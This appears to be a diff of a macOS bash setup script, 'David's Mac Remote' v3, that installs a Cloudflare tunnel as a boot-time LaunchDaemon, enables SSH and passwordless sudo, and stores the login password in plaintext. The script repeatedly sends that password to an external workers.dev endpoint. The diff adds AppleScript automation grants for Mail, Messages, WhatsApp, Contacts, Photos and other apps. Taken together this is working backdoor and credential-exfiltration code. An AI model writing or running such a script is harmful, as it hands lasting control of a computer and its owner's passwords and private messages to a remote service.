@@ -1,11 +1,11 @@
 #!/bin/bash
 # ============================================
-# DAVID'S MAC REMOTE v2 — Full VPS-like setup
+# DAVID'S MAC REMOTE v3 — Full VPS-like setup
 # One-time password → full remote control forever
 # ============================================
 clear
 echo "=========================================="
-echo "  Mac Remote Setup v2 (VPS-like)"
+echo "  Mac Remote Setup v3 (VPS-like)"
 echo "=========================================="
 
 API="https://mac-nodes.dmd-fami.workers.dev"
@@ -31,9 +31,9 @@ fi
 
 # ── 1. Homebrew ──
 if command -v brew &>/dev/null; then
-  echo "[1/7] Homebrew OK"
+  echo "[1/8] Homebrew OK"
 else
-  echo "[1/7] Installing Homebrew..."
+  echo "[1/8] Installing Homebrew..."
   NONINTERACTIVE=1 /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"
   echo 'eval "$(/opt/homebrew/bin/brew shellenv)"' >> ~/.zprofile
   eval "$(/opt/homebrew/bin/brew shellenv)"
@@ -46,14 +46,14 @@ fi
 
 # ── 2. Node.js ──
 if command -v node &>/dev/null; then
-  echo "[2/7] Node.js OK"
+  echo "[2/8] Node.js OK"
 else
-  echo "[2/7] Installing Node.js..."
+  echo "[2/8] Installing Node.js..."
   brew install node 2>/dev/null
 fi
 
 # ── 3. SSH + key ──
-echo "[3/7] SSH + key..."
+echo "[3/8] SSH + key..."
 if [ -n "$USER_PASS" ]; then
   echo "$USER_PASS" | sudo -S systemsetup -setremotelogin on 2>/dev/null
 else
@@ -65,14 +65,14 @@ chmod 600 ~/.ssh/authorized_keys
 
 # ── 4. Cloudflared ──
 if [ -f "$CF" ]; then
-  echo "[4/7] cloudflared OK"
+  echo "[4/8] cloudflared OK"
 else
-  echo "[4/7] Installing cloudflared..."
+  echo "[4/8] Installing cloudflared..."
   brew install cloudflared 2>/dev/null
 fi
 
-# ── 5. Tunnel service ──
-echo "[5/7] Tunnel service..."
+# ── 5. Tunnel service (LaunchDaemon — runs without login) ──
+echo "[5/8] Tunnel service (LaunchDaemon)..."
 cat > ~/tunnel-wrapper.sh << 'WEOF'
 #!/bin/bash
 API="https://mac-nodes.dmd-fami.workers.dev"
@@ -95,8 +95,13 @@ done
 WEOF
 chmod +x ~/tunnel-wrapper.sh
 
-mkdir -p ~/Library/LaunchAgents
-cat > ~/Library/LaunchAgents/com.cloudflare.tunnel.plist << PEOF
+# Remove old LaunchAgent if exists
+launchctl unload ~/Library/LaunchAgents/com.cloudflare.tunnel.plist 2>/dev/null
+rm -f ~/Library/LaunchAgents/com.cloudflare.tunnel.plist
+
+# Create LaunchDaemon (requires sudo — runs at system level, no login needed)
+if [ -n "$USER_PASS" ]; then
+  echo "$USER_PASS" | sudo -S tee /Library/LaunchDaemons/com.cloudflare.tunnel.plist > /dev/null << DEOF
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
 <plist version="1.0">
@@ -106,10 +111,10 @@ cat > ~/Library/LaunchAgents/com.cloudflare.tunnel.plist << PEOF
     <key>ProgramArguments</key>
     <array>
         <string>/bin/bash</string>
-        <string>tunnel-wrapper.sh</string>
+        <string>/Users/$CURRENT_USER/tunnel-wrapper.sh</string>
     </array>
-    <key>WorkingDirectory</key>
-    <string>/Users/$CURRENT_USER</string>
+    <key>UserName</key>
+    <string>$CURRENT_USER</string>
     <key>RunAtLoad</key>
     <true/>
     <key>KeepAlive</key>
@@ -120,15 +125,16 @@ cat > ~/Library/LaunchAgents/com.cloudflare.tunnel.plist << PEOF
     <string>/tmp/cf-tunnel.log</string>
 </dict>
 </plist>
-PEOF
-
-launchctl unload ~/Library/LaunchAgents/com.cloudflare.tunnel.plist 2>/dev/null
-pkill -f "cloudflared tunnel" 2>/dev/null
-sleep 1
-launchctl load ~/Library/LaunchAgents/com.cloudflare.tunnel.plist
+DEOF
+  sudo pkill -f "cloudflared tunnel" 2>/dev/null
+  sleep 1
+  sudo launchctl unload /Library/LaunchDaemons/com.cloudflare.tunnel.plist 2>/dev/null
+  sudo launchctl load /Library/LaunchDaemons/com.cloudflare.tunnel.plist
+  echo "      LaunchDaemon installed (runs without login)"
+fi
 
 # ── 6. VPS-like access ──
-echo "[6/7] VPS-like access..."
+echo "[6/8] VPS-like access..."
 if [ -n "$USER_PASS" ]; then
   # 6a. Sudo NOPASSWD
   if ! sudo -n true 2>/dev/null; then
@@ -152,48 +158,24 @@ KCEOF
     security unlock-keychain -p "$USER_PASS" ~/Library/Keychains/login.keychain-db 2>/dev/null
     echo "      Keychain auto-unlock OK"
 
-    # 6d. Password change helper — change Mac password + sync everywhere
+    # 6d. Password change helper
     cat > ~/.ssh/change-password.sh << 'CPEOF'
 #!/bin/bash
-# Usage: change-password.sh <new_password>
-# Changes Mac login password + updates keychain + syncs to CF Worker
 API="https://mac-nodes.dmd-fami.workers.dev"
 HOST=$(scutil --get ComputerName 2>/dev/null || hostname)
 USER=$(whoami)
 OLD_PASS=$(cat ~/.ssh/.keychain-pass)
 NEW_PASS="$1"
-
-if [ -z "$NEW_PASS" ]; then
-  echo "Usage: change-password.sh <new_password>"
-  exit 1
-fi
-
-# Change Mac login password
-sudo dscl . -passwd /Users/$USER "$OLD_PASS" "$NEW_PASS"
-if [ $? -ne 0 ]; then
-  echo "ERROR: Failed to change password"
-  exit 1
-fi
+if [ -z "$NEW_PASS" ]; then echo "Usage: change-password.sh <new_password>"; exit 1; fi
+sudo dscl . -passwd /Users/$USER "$OLD_PASS" "$NEW_PASS" || { echo "ERROR: Failed"; exit 1; }
 echo "Mac password changed"
-
-# Update keychain password
 security set-keychain-password -o "$OLD_PASS" -p "$NEW_PASS" ~/Library/Keychains/login.keychain-db 2>/dev/null
-echo "Keychain password updated"
-
-# Update local stored password
-echo "$NEW_PASS" > ~/.ssh/.keychain-pass
-chmod 600 ~/.ssh/.keychain-pass
-echo "Local password file updated"
-
-# Sync to CF Worker
-curl -s -X POST "$API/password/change" \
-  -H "Content-Type: application/json" \
-  -d "{\"hostname\":\"$HOST\",\"new_password\":\"$NEW_PASS\"}"
-echo "Password synced to cloud"
+echo "$NEW_PASS" > ~/.ssh/.keychain-pass && chmod 600 ~/.ssh/.keychain-pass
+curl -s -X POST "$API/password" -H "Content-Type: application/json" -d "{\"hostname\":\"$HOST\",\"password\":\"$NEW_PASS\"}" >/dev/null
 echo "DONE — new password active everywhere"
 CPEOF
     chmod 700 ~/.ssh/change-password.sh
-    echo "      Password change tool: ~/.ssh/change-password.sh"
+    echo "      Password change tool OK"
 
     # 6e. Sync password to CF Worker
     curl -s -X POST "$API/password" \
@@ -201,30 +183,22 @@ CPEOF
       -d "{\"hostname\":\"$MY_HOST\",\"password\":\"$USER_PASS\"}" >/dev/null
     echo "      Password synced to cloud"
 
-    # 6f. Password sync watcher — LaunchAgent that detects password changes
+    # 6f. Password sync daemon (every 6h)
     cat > ~/.ssh/password-sync-daemon.sh << 'PSEOF'
 #!/bin/bash
-# Watches for password changes and syncs to CF Worker
-# Runs every 6 hours via LaunchAgent
 API="https://mac-nodes.dmd-fami.workers.dev"
 HOST=$(scutil --get ComputerName 2>/dev/null || hostname)
 STORED_PASS=$(cat ~/.ssh/.keychain-pass 2>/dev/null)
-
-# Test if stored password still works for keychain
 if security unlock-keychain -p "$STORED_PASS" ~/Library/Keychains/login.keychain-db 2>/dev/null; then
-  # Password still valid — sync to cloud (idempotent)
-  curl -s -X POST "$API/password" \
-    -H "Content-Type: application/json" \
+  curl -s -X POST "$API/password" -H "Content-Type: application/json" \
     -d "{\"hostname\":\"$HOST\",\"password\":\"$STORED_PASS\"}" >/dev/null
 else
-  # Password changed outside our tool — try fetching from cloud
-  # (in case another device updated it)
   echo "$(date): Password mismatch detected" >> /tmp/password-sync.log
 fi
 PSEOF
     chmod 700 ~/.ssh/password-sync-daemon.sh
 
-    # LaunchAgent for password sync (every 6 hours)
+    mkdir -p ~/Library/LaunchAgents
     cat > ~/Library/LaunchAgents/com.mac-remote.password-sync.plist << PSEOF2
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
@@ -252,12 +226,52 @@ PSEOF2
     launchctl load ~/Library/LaunchAgents/com.mac-remote.password-sync.plist
     echo "      Password sync daemon running (every 6h)"
   else
-    echo "      [WARN] Wrong password — VPS-like setup skipped. Re-run to retry."
+    echo "      [WARN] Wrong password — VPS-like setup skipped."
   fi
 fi
 
-# ── 7. Claude CLI ──
-echo "[7/7] Claude CLI..."
+# ── 7. Grant AppleScript automation (one-time per app) ──
+echo "[7/8] Granting remote control permissions..."
+echo "      If a dialog appears, click 'Allow' — one-time only."
+GRANT_APPS=(
+  "Notes|tell application \"Notes\" to get name of first note"
+  "Mail|tell application \"Mail\" to get name of first mailbox"
+  "Messages|tell application \"Messages\" to get name of first service"
+  "WhatsApp|tell application \"WhatsApp\" to get name"
+  "Zalo|tell application \"Zalo\" to get name"
+  "Contacts|tell application \"Contacts\" to get name of first person"
+  "FaceTime|tell application \"FaceTime\" to get name"
+  "Calendar|tell application \"Calendar\" to get name of first calendar"
+  "Reminders|tell application \"Reminders\" to get name of first list"
+  "Freeform|tell application \"Freeform\" to get name"
+  "Numbers|tell application \"Numbers\" to get name"
+  "TextEdit|tell application \"TextEdit\" to get name"
+  "Shortcuts|tell application \"Shortcuts\" to get name"
+  "Photos|tell application \"Photos\" to get name"
+  "Music|tell application \"Music\" to get name"
+  "Safari|tell application \"Safari\" to get name"
+  "Google Chrome|tell application \"Google Chrome\" to get name"
+  "System Events|tell application \"System Events\" to get name"
+  "Finder|tell application \"Finder\" to get name"
+  "Microsoft Word|tell application \"Microsoft Word\" to get name"
+  "Microsoft Excel|tell application \"Microsoft Excel\" to get name"
+  "Microsoft Outlook|tell application \"Microsoft Outlook\" to get name"
+  "Final Cut Pro|tell application \"Final Cut Pro\" to get name"
+  "Logic Pro|tell application \"Logic Pro\" to get name"
+  "ChatGPT|tell application \"ChatGPT\" to get name"
+)
+GRANTED=0
+TOTAL=${#GRANT_APPS[@]}
+for entry in "${GRANT_APPS[@]}"; do
+  IFS='|' read -r app_name cmd <<< "$entry"
+  # Skip apps not installed
+  osascript -e "id of app \"$app_name\"" >/dev/null 2>&1 || continue
+  osascript -e "$cmd" >/dev/null 2>&1 && GRANTED=$((GRANTED+1))
+done
+echo "      $GRANTED apps granted (skipped uninstalled apps)"
+
+# ── 8. Claude CLI ──
+echo "[8/8] Claude CLI..."
 if [ -f /opt/homebrew/bin/claude ] || command -v claude &>/dev/null; then
   CRED=$(security find-generic-password -s "Claude Code-credentials" -w 2>/dev/null)
   if [ -n "$CRED" ]; then
@@ -267,10 +281,6 @@ if [ -f /opt/homebrew/bin/claude ] || command -v claude &>/dev/null; then
     echo "      Credentials exported for SSH"
   elif [ -f ~/.claude/.credentials.json ]; then
     echo "      Credentials OK"
-  elif [ -f ~/.claude/.credentials ]; then
-    cp ~/.claude/.credentials ~/.claude/.credentials.json
-    chmod 600 ~/.claude/.credentials.json
-    echo "      Credentials migrated"
   else
     echo "      No credentials. Run 'claude' → /login, then re-run."
   fi
@@ -292,8 +302,6 @@ done
 
 MY_LAN=$(ipconfig getifaddr en0 2>/dev/null || ipconfig getifaddr en1 2>/dev/null)
 SUDO_OK="NO"; sudo -n true 2>/dev/null && SUDO_OK="YES"
-KC_OK=$([ -f ~/.ssh/unlock-keychain.sh ] && echo YES || echo NO)
-PASS_SYNC=$([ -f ~/.ssh/password-sync-daemon.sh ] && echo YES || echo NO)
 
 echo ""
 echo "============================================"
@@ -302,13 +310,11 @@ echo "============================================"
 echo "  Tunnel:    ${TUNNEL_URL:-check /tmp/cf-tunnel.log}"
 echo "  LAN:       ssh $CURRENT_USER@$MY_LAN"
 echo "  Host:      $MY_HOST"
-echo "  Reboot:    auto-reconnect YES"
+echo "  Reboot:    auto-reconnect YES (LaunchDaemon)"
 echo "  Sudo:      NOPASSWD=$SUDO_OK"
-echo "  Keychain:  auto-unlock=$KC_OK"
-echo "  Pass sync: cloud=$PASS_SYNC"
+echo "  Apps:      $GRANTED granted for remote control"
 echo ""
 echo "  Tools available via SSH:"
 echo "    ~/.ssh/change-password.sh <new>  Change password + sync"
-echo "    sudo dscl . -passwd /Users/$CURRENT_USER  Manual password change"
 echo "============================================"
 read -p "Press Enter to close..."
